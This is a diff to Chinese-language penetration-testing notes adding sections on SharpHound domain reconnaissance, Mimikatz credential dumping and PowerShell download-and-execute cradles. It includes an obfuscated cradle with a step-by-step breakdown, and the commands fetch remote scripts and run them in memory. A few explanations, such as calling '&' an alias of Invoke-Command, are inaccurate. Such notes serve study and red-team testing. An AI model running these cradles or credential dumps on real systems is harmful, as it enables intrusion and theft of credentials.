@@ -25,6 +25,12 @@
     - [使用 wmic](#使用-wmic)
     - [在powershell 中使用 Invoke-WmiMethod 新建进程](#在powershell-中使用-invoke-wmimethod-新建进程)
       - [在 powershell 中从 Win32\_Process 派生一个类新建进程](#在-powershell-中从-win32_process-派生一个类新建进程)
+  - [信息收集](#信息收集)
+    - [域内信息收集](#域内信息收集)
+      - [SharpHound](#sharphound)
+    - [获取凭证](#获取凭证)
+      - [Mimikatz](#mimikatz)
+  - [下载与执行文件](#下载与执行文件)
   - [域渗透](#域渗透)
     - [域内提权-42278/42287](#域内提权-4227842287)
 
@@ -751,9 +757,42 @@ try { $CleanupClass.Delete() } catch {}
 
 ---
 
-## 获取凭证
+## 信息收集
 
-### Mimikatz
+### 域内信息收集
+
+#### SharpHound
+
+下载文件再执行:
+
+```powershell
+New-Item -Type Directory "C:\AtomicRedTeam\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "C:\AtomicRedTeam\ExternalPayloads\SharpHound.ps1"
+import-module "C:\AtomicRedTeam\ExternalPayloads\SharpHound.ps1"
+try { Invoke-BloodHound -OutputDirectory $env:Temp }
+catch { $_; exit $_.Exception.HResult}
+Start-Sleep 5
+
+# 删除输出目录
+Remove-Item $env:Temp\*BloodHound.zip -Force
+```
+
+直接下载脚本信息并执行
+
+```powershell
+write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
+IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
+Invoke-BloodHound -OutputDirectory $env:Temp
+Start-Sleep 5
+```
+
+
+
+---
+
+### 获取凭证
+
+#### Mimikatz
 
 ```cmd
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
@@ -761,7 +800,188 @@ powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githu
 
 ![image-20231203201414385](http://cdn.ayusummer233.top/DailyNotes/202312032014427.png)
 
+---
 
+## 下载与执行文件
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
+
+(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
+
+Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
+```
+- `(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1')`: 从 `http://bit.ly/L3g1tCrad1e` 下载文件并保存为 `Default_File_Path.ps1`
+
+- `IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))`: 读取 `Default_File_Path.ps1` 中的所有字节, 将其转换为字符并使用 `-Join` 连接, 然后使用 `IEX` 执行
+
+- `[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()`: 读取 `Default_File_Path.ps1` 中的所有字节, 将其转换为字符并使用 `-Join` 连接, 然后使用 `[ScriptBlock]::Create` 创建一个脚本块, 并使用 `InvokeReturnAsIs` 执行
+
+- 最后一行代码写得比较复杂,涉及多个变量, 使用反射调用和动态方法调用
+  ```powershell
+  # 设置变量 HJ1 为 http://bit.ly/L3g1tCrad1e
+  Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e'; 
+  # 设置变量 0W 为 Net.WebClient
+  SI Variable:/0W 'Net.WebClient'; 
+  # 设置变量 gH 为 Default_File_Path.ps1
+  Set-Item Variable:\gH 'Default_File_Path.ps1'; 
+  # 列出当前目录下所有以下划线 _ 开头的文件和文件夹
+  ls _-*; 
+  Set-Variable igZ (
+      
+      .$ExecutionContext.InvokeCommand.(
+          (
+              $ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }
+          ).Name
+      ).Invoke(
+          $ExecutionContext.InvokeCommand.(
+              ($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name
+          ).Invoke('*w-*ct', $TRUE, 1)
+      )(Get-ChildItem Variable:0W).Value
+  ); 
+  Set-Variable J (
+      (
+          (
+              (Get-Variable igZ -ValueOn) | GM
+          ) | ? { $_.Name -like '*w*i*le' }
+      ).Name
+  ); 
+  (Get-Variable igZ -ValueOn).(
+      (ChildItem Variable:J).Value
+  ).Invoke(
+      (Get-Item Variable:/HJ1).Value, (GV gH).Value
+  ); 
+  &( ''.IsNormalized.ToString()[13, 15, 48] -Join '')( -Join ([Char[]](CAT -Enco 3 (GV gH).Value)))
+  ```
+  - `Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e'`: 设置变量 `HJ1` 的值为 `http://bit.ly/L3g1tCrad1e`
+  
+  - `SI Variable:/0W 'Net.WebClient'`
+    - `SI` 是 `Set-Item` 的别名, 用于设置变量的值
+    - `Variable:/0W` 是变量的路径, 这里是 `Variable` 命名空间下的 `0W` 变量
+    
+  - `Set-Item Variable:\gH 'Default_File_Path.ps1'`: 设置变量 `gH` 的值为 `Default_File_Path.ps1`
+  
+  - `ls _-*`: 列出当前目录下所有以下划线 _ 开头的文件和文件夹
+  
+  - `Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value)`
+    
+    ![image-20231203222340281](http://cdn.ayusummer233.top/DailyNotes/202312032223308.png)
+    
+    - `Set-Variable igZ`: 设置变量 `igZ` 的值
+    
+    - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value`
+    
+      ![image-20231203221543335](http://cdn.ayusummer233.top/DailyNotes/202312032215370.png)
+    
+      - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name)`
+    
+        ![image-20231203221726260](http://cdn.ayusummer233.top/DailyNotes/202312032217291.png)
+    
+      - `.Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))`
+    
+        - `$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1)`: `New-Object`
+    
+          ![image-20231203222117938](http://cdn.ayusummer233.top/DailyNotes/202312032221995.png)
+    
+          
+    
+          
+    
+        
+    
+    - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))(Get-ChildItem Variable:0W).Value`
+      
+      - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name)`
+        - `.$ExecutionContext.InvokeCommand`: 获取 `InvokeCommand` 的方法
+        
+        - `($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name`: 获取 `PsObject` 的方法中名称中包含 `Cm*t` 的方法的名称, 也即 `GetCmdlet`
+          
+          ![image-20231203214534295](http://cdn.ayusummer233.top/DailyNotes/202312032145351.png)
+          
+          - `().Name`: 获取名称
+          
+          - `$ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }`: 获取 `PsObject` 中名称中包含 `Cm*t` 的方法, 也即 `System.Management.Automation.CmdletInfo GetCmdlet(string commandName)`
+            
+            ![image-20231203214409915](http://cdn.ayusummer233.top/DailyNotes/202312032144946.png)
+            
+            - `$ExecutionContext.InvokeCommand.PsObject.Methods`: 获取 `PsObject` 的方法
+              - `PsObject` 是 `PowerShell` 中的一个类, 用于表示对象的属性和方法
+            - `? { $_.Name -like '*Cm*t' }`: 获取名称中包含 `Cm*t` 的方法
+            - `System.Management.Automation.CmdletInfo GetCmdlet(string commandName)`: `GetCmdlet` 方法的作用是获取命令的信息, 也即 `Get-Command`
+              - `System.Management.Automation`：是 PowerShell 的 .NET 命名空间，提供对 PowerShell 运行时的程序化访问。这包括执行命令、管理运行空间、创建和管理 PowerShell 管道等功能。
+              - `CmdletInfo` 是一个类，它提供了有关 PowerShell cmdlet 的详细信息，如 cmdlet 的名称、模块、参数等
+              - `GetCmdlet` 是 `CmdletInfo` 类的一个方法，用于获取 cmdlet 的信息; 它的参数是 cmdlet 的名称，返回值是 `CmdletInfo` 对象
+          
+        - `.Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))`: 调用 `New-Object` 
+          
+          - `.Invoke`: 方法调用, 这里即为调用前面获取的 `GetCmdlet` 方法, `GetCmdlet` 方法的作用是获取命令的信息
+          
+          - `$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1)`: `New-Object`
+          
+            ![image-20231203220848022](http://cdn.ayusummer233.top/DailyNotes/202312032208065.png)
+          
+            - `$ExecutionContext.InvokeCommand`
+          
+              - `$ExecutionContext` 是一个自动变量，提供了关于当前 PowerShell 运行环境的信息和功能
+              - `InvokeCommand` 是一个属性，它提供了对当前运行的命令的访问
+            - `($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name`: `GetCommandName` 方法的名称, 也即 `Get-CommandName`
+          
+              ![image-20231203220125418](http://cdn.ayusummer233.top/DailyNotes/202312032201443.png)
+          
+            - `().Name`: 获取名称
+          
+            - `$ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }`: 获取名称中包含 `om*e` 的成员, 也即 `Get-CommandName` 方法
+          
+              ![image-20231203220148077](http://cdn.ayusummer233.top/DailyNotes/202312032201101.png)
+          
+              - `$ExecutionContext.InvokeCommand | GM`: 获取当前运行的命令的信息
+                - `GM` 是 `Get-Member` 的别名, 用于获取对象的成员
+              - `? { $_.Name -like '*om*e' }`: 获取名称中包含 `om*e` 的成员
+                - `?` 是 `Where-Object` 的别名, 用于筛选对象
+          
+            - `Get-CommandName` 方法的作用是获取命令的名称, 也即 `Get-Command`
+              - `Get-Command` 是一个 cmdlet，用于获取命令的信息，如命令的名称、模块、参数等
+          
+            - `.Invoke('*w-*ct', $TRUE, 1)`: 调用 `New-Object` 
+              - `.Invoke`: 方法调用, 这里即为调用前面获取的 `GetCommandName` 方法, `GetCommandName` 方法的作用是获取命令的名称
+              - `'*w-*ct'`: 通过通配符匹配命令的名称, 也即 `New-Object`
+              - `$TRUE`: `New-Object` 的参数, 用于指定是否使用 PowerShell 的安全模式创建对象
+              - `1`: `New-Object` 的参数, 用于指定创建对象的深度
+          
+        
+      
+    - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))`: 获取 `New-Object` 的方法
+      
+      - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name)`
+        - `.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods | ? { $_.Name -like '*Cm*t' }).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))`
+          - `.Name`: 获取名称
+          - `.$ExecutionContext.InvokeCommand`: 获取 `InvokeCommand` 的方法
+      - `.Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand | GM | ? { $_.Name -like '*om*e' }).Name).Invoke('*w-*ct', $TRUE, 1))`
+      
+    - `(Get-ChildItem Variable:0W).Value`: 获取变量 `0W` 的值, 即 `Net.WebClient`
+
+
+  - `Set-Variable J ((((Get-Variable igZ -ValueOn) | GM) | ? { $_.Name -like '*w*i*le' }).Name); (Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value, (GV gH).Value)`: `DownloadFile`
+
+  - `&( ''.IsNormalized.ToString()[13, 15, 48] -Join '')( -Join ([Char[]](CAT -Enco 3 (GV gH).Value)))`: 
+    
+    - `( ''.IsNormalized.ToString()[13, 15, 48] -Join '')`: `(iex)`
+    
+    - `-Join ([Char[]](CAT -Enco 3 (GV gH).Value))`
+    
+      ![image-20231203223347151](http://cdn.ayusummer233.top/DailyNotes/202312032233186.png)
+    
+      - `CAT -Enco 3 (GV gH).Value`: 获取变量 `gH` 的值, 并使用 `CAT` 命令将其转换为 `UTF-8` 编码
+        - `CAT` 是 `Get-Content` 的别名, 用于获取文件的内容
+        - `-Enco 3`: 指定编码为 `UTF-8`
+        - `(GV gH).Value`: 获取变量 `gH` 的值, 即 `Default_File_Path.ps1`
+          - `GV` 是 `Get-Variable` 的别名, 用于获取变量的值
+      - `[Char[]]`: 将字符串转换为字符数组
+      - `-Join`: 连接字符数组
+    - 整个连起来就是: `&((iex)(-Join ([Char[]](CAT -Enco 3 (GV gH).Value))))`
+      - `iex` 是 `Invoke-Expression` 的别名, 用于执行字符串中的命令
+      - `&` 是 `Invoke-Command` 的别名, 用于执行命令
+      - 整个命令的作用是执行 `Default_File_Path.ps1` 中的命令
 ---
 
 ## 域渗透
